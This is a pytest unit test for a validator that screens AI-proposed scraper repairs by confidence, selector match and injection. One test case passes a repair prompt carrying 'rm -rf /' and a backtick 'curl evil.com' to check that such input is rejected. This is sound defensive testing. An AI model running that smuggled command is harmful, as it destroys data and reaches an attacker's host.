import pytest
from backend.app.models.domain import EvidenceBundle
from backend.app.models.repair_proposal import RepairProposal
from backend.app.engine.validator import RepairValidator
from backend.app.engine.diagnoser import GeminiAIDiagnoser

@pytest.mark.asyncio
async def test_repair_validator_rules():
    validator = RepairValidator()
    
    # 1. Valid proposal
    valid_proposal = RepairProposal(
        diagnosis="Class cve-id was renamed to vulnerability-badge",
        target_field="cve_id",
        evidence="Found table with .vulnerability-badge containing CVE string",
        proposed_selector=".vulnerability-badge",
        repair_prompt="Extract the CVE identifier from .vulnerability-badge elements",
        confidence=0.92,
        expected_output="CVE-2026-4401"
    )
    dom_content = "<td class='vulnerability-badge'>CVE-2026-4401</td>"
    is_valid, reason = validator.validate(valid_proposal, dom_content)
    assert is_valid is True
    assert reason == "VALID"

    # 2. Low confidence rejection
    low_conf = valid_proposal.model_copy(update={"confidence": 0.65})
    is_valid, reason = validator.validate(low_conf, dom_content)
    assert is_valid is False
    assert "confidence" in reason.lower()

    # 3. Malicious shell injection in repair_prompt rejection
    injected_proposal = valid_proposal.model_copy(update={
        "repair_prompt": "Extract cve; rm -rf /; `curl evil.com`"
    })
    is_valid, reason = validator.validate(injected_proposal, dom_content)
    assert is_valid is False
    assert "injection" in reason.lower() or "disallowed" in reason.lower()

    # 4. Selector not matching DOM rejection
    non_matching = valid_proposal.model_copy(update={
        "proposed_selector": ".non-existent-missing-class-xyz"
    })
    is_valid, reason = validator.validate(non_matching, dom_content)
    assert is_valid is False
    assert "selector" in reason.lower() or "not found" in reason.lower()
